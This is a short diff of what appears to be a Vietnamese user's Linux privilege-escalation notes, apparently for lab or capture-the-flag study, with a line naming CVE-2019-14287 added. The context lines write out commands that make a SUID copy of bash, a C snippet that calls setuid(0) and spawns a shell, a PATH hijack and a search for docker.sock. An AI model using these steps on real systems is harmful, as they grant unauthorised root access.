@@ -50,4 +50,5 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/hack.sh
 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c        suid-env
    export PATH=/tmp:$PATH
 find / -name docker.sock 2>/dev/null
+CVE-2019-14287
 Hi vọng sẽ giúp ích cho bạn, NSF khó quá nên tui không ghi :V
